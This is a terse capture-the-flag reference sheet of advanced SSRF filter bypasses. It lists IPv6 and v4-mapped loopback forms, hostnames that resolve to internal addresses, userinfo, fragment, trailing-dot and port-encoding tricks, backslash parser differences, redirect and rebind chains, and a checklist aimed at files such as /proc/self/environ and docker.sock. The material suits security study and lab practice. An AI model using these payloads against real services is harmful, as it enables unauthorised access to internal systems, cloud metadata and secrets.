# Advanced reach — the last-mile tricks

The less-common reaches — the shapes that turn "confirmed SSRF"
into "the flag" when the standard chains stall.

---

## 1. The IPv6 shadow — the v6-only reach

```text
the check is ipv4-shaped → the v6-loopback and v6-private:
  [::1]                 → ipv6-loopback
  [::ffff:127.0.0.1]    → v4-mapped-v6 — 127.0.0.1 through v6!
  [0:0:0:0:0:ffff:127.0.0.1]
  [::ffff:7f00:1]       → v4-mapped-hex-form
  [fe80::1]             → link-local
  [fc00::1]             → ula — the v6-private-range
  [fd00::1]
  [::]                  → the unspecified — "any" — may route
                          loopback on the host
the v4-check sees "no private-ipv4" — the v6-answer IS the
loopback — the A/AAAA asymmetry — dns-rebind.md §8 — the fetcher
prefers v6 → loopback
```

## 2. The DNS-name-forms — names that resolve inside

```text
the "name" isn't a rebind — it's a name that RESOLVES internal:
  localhost            → 127.0.0.1
  localhost.localdomain
  ip6-localhost        → ::1 — the /etc/hosts entry
  ip6-loopback
  ip6-allnodes         → ff02::1
  ip6-allrouters       → ff02::2
  ip6-allhosts         → ff02::3
  ip6-localnet         → fe00::0
  ip6-mcastprefix
  broadcasthost        → 255.255.255.255 — the broadcast — a
                          reach — the local-segment-broadcast
  host.docker.internal → the docker-host — docker-desktop — the
                          name reaches the host!
  gateway.docker.internal
  docker.for.mac.localhost / docker.for.mac.host.internal — older
  kubernetes.default / kubernetes.default.svc — the api
  host.k3d.internal
  *.nip.io / *.xip.io / *.sslip.io / *.localtest.me / lvh.me /
    vcap.me — the name-for-ip family — the STRING is a name —
    the RESOLUTION is the ip — beats string-only checks
```

## 3. The protocol-relative URL — the scheme-relative

```text
url=//internal/           — scheme-relative — the fetcher inherits
                           the base-scheme — http → http://internal —
                           the scheme-check sees "no scheme" — the
                           base's scheme applies — the check may
                           require ^http → "//internal" has no
                           scheme-prefix → passes some checks →
                           then resolves to http://internal
url=///internal/          — triple-slash — authority-empty vs
                           path — parser-diff
url=\\\\internal\\x        — unc-form — windows — the smb-path
```

## 4. The userinfo-tricks — creds in the url

```text
url=http://user:pass@internal/  — the userinfo carries credentials —
                                  the fetcher may send them — an
                                  authenticated-internal-reach —
                                  the internal-route's basic-auth —
                                  the creds ride the url
url=http://internal@allowed/    — the host-confusion — covered —
                                  the auth-field variant — the
                                  userinfo-shape is also a bypass —
                                  the "@" in the url
url=http://:80@internal/        — the empty-userinfo-with-port —
                                  the colon-in-authority — the
                                  port-or-userinfo ambiguity —
                                  parser-diff
url=http://internal:@x/         — empty-password
url=http://:@internal/          — empty-userinfo — the @-with-nothing
```

## 5. The fragment-injection — the #-games

```text
url=http://internal/#x        — fragment — the fetcher strips the
                                fragment usually — the fragment
                                doesn't reach the wire — the
                                check may see it as part-of-the-url
url=http://internal%23x       — encoded-# — the %23 reaches the
                                wire as text — the path contains
                                the literal-%23 — a real path-char
url=http://internal#x.y.z     — the fragment carries tokens — the
                                suffix-check tricks — "ends with
                                .example.com" satisfied by the
                                fragment
url=http://internal?x#y       — the ?-before-# — the query-then-
                                fragment order
url=http://internal%23@x      — the encoded-#-then-@ — decode-order
```

## 6. The trailing-dot and the fqdn-form

```text
url=http://internal./         — the fqdn-dot — trailing-dot — the
                                resolver treats it as absolute —
                                the string ends with "." — the
                                name-check "is it internal" — the
                                trailing-dot is a different-string
                                same-resolution
url=http://127.0.0.1./        — the ip-trailing-dot — some
                                resolvers handle it — the check
                                sees "127.0.0.1." — not "127.0.0.1"
url=http://localhost./        — the fqdn-localhost
url=http://internal../        — double-dot — the odd-form — the
                                check's string-compare vs the
                                resolver's normalization
url=http://internal../
```

## 7. The port-0 and the boundary-ports

```text
url=http://internal:0/         — port-0 — the "any-port" —
                                resolver-behavior differs — some
                                read as 80, some as 0, some fail —
                                the parser-diff
url=http://internal:65535/     — the max-port
url=http://internal:65536/     — over-max — the parser-overflow —
                                wraps? fails? different-parsers
url=http://internal:-1/        — negative-port
url=http://internal:+80/       — signed-port
url=http://internal: 80/       — space-port
url=http://internal:0x50/      — hex-80
url=http://internal:080/       — padded-80
url=http://internal:0b1010000/ — binary-80
url=http://internal:999999999/ — huge — the int-overflow
```

## 8. The path-vs-authority ambiguity

```text
url=http://internal\path      — the backslash — curl treats \ as / —
                                the path-or-authority ambiguity —
                                "internal\path" → "internal/path" —
                                the authority is "internal" — the
                                path starts — or is "internal\path"
                                the whole authority? — parser-diff
url=http://internal/path@x     — the path-contains-@ — the @-in-path
url=http://internal/path:80    — the port-in-path — the :-in-path
url=http://internal%5cpath     — encoded-backslash
url=http://internal%2fpath     — encoded-slash
```

## 9. The dns-nameserver tricks — the resolution-side

```text
the resolver's behavior:
  - the search-domain — /etc/resolv.conf — the unqualified name
    gets the search-suffix — "internal" → "internal.svc.cluster.
    local" — the search-suffix completes it — the unqualified-
    name is a full-name in the right-domain
  - the ndots — the dots-threshold — a name with <ndots dots gets
    search-suffixed — "internal" (0 dots < 5) → search-path —
    "internal.com" (1 dot < 5) → search-path too — "internal.com."
    (trailing-dot) → absolute — the trailing-dot suppresses the
    search
  - the wildcard-dns — *.svc.cluster.local — any-name resolves —
    the wildcard-catchall
  - the node-local-dns — the cluster's dns — the svc-name short-
    forms — "service" → "service.namespace.svc.cluster.local"
```

## 10. The request-target composition — the url-part injection

```text
the url-param joins a template — the composition-points:
  fetch("http://"+host+"/x")   — the host-mid — the mid-injection —
                                "internal:6379/x?" — the port+path
                                ride the host-field
  fetch(base+path)              — the path-join — "/../internal" —
                                  the path-traversal — the joiner
                                  normalizes? — "/%2e%2e/internal"
  fetch(scheme+"://"+host)      — the parts — the scheme-control
  fetch(url+"?x=y")             — the suffix — the query-append —
                                  the url already has ? — "&" vs "?"
                                  — the append-boundary
  fetch(template.format(url))   — the format-insert — the url is
                                  the var — the format-string-boundary
```

## 11. The last-hop tricks — the redirect + rebind + diff

```text
the combined-chain — the bypass needs two tricks:
  whitelist + internal — the redirect-from-allowed + the @ —
    url=http://allowed.com/redirect?to=http://internal@x/ —
    the allowed-domain's open-redirect + the parser-diff on the
    redirect-target
  blacklist + rebind + port — the rebind + the port-check —
    url=http://rebind:6379/ — the port-check passes the port —
    the rebind handles the ip
  scheme-check + the parser — "must be http" + the \ tricks —
    "http:\\internal" — the backslash-form — the check's string
    starts-with-"http" + the fetcher's \-as-/
```

## 12. The OS-level reach — when http isn't enough

```text
- the url reaches a socket — http+unix — unix-socket.md
- the url reaches a raw-tcp — gopher — the service-protocols
- the url reaches a file — file:// — the fs
- the url reaches an internal-api — http — the web-services
- the url reaches a container-control — docker/k8s
- the url reaches a mail — smtp/imap/pop3 — the mail-protocols
- the url reaches a dir — ldap — the directory
- the url reaches a store — redis/memcached — the kv
```

## 13. The "what's left" checklist

```text
when the standard chains stall — the reach-inventory:
  □ all 20 payload-dictionary families tried?
  □ the scheme-table — which schemes actually respond?
  □ the loopback-inventory — every loopback-name + the encodings
  □ the metadata-IP — cloud-confirmed?
  □ the sibling-services — the subnet-sweep — the compose-names
  □ the file-map — /flag /proc/self/environ /proc/self/cwd/* —
    the env + the cwd-prefix
  □ the deferred-shapes — stored-url? the results-channel?
  □ the redirect-chain — an open-redirect on the allowed-domain?
  □ the rebind — the resolve-twice gap?
  □ the crlf — does %0d%0a reach the wire?
  □ the gopher — curl-fetcher confirmed?
  □ the parser-diff — two-parser games on the string?
  □ the header-forward — does the app send auth cross-origin?
  □ the second-order — the store-then-fetch gap?
  □ the unix-socket — docker.sock via http+unix?
  □ the internal-admin — 127.0.0.1:app-port/admin?
```

## 14. The stop-condition — when the chain can't reach

```text
the falsifier-ladder — the chain dies when:
  - no-fetch — the param isn't fetched — not-ssrf
  - fetch-but-no-internal — the fetcher is egress-only — the
    internal-legs are blocked at the socket-level — the chain
    can't reach — the class exists but the impact can't —
    record the class-confirm, mark the impact unreachable,
    escalate
  - internal-but-no-channel — pure-blind + no state-write —
    the rare dead-end — the blind-extraction needs a store —
    no store → no channel → the escalation-paths are the answer
  - the whitelist is airtight AND no redirect/rebind/diff —
    the closed-case — every family measured dead — the kill-map
```
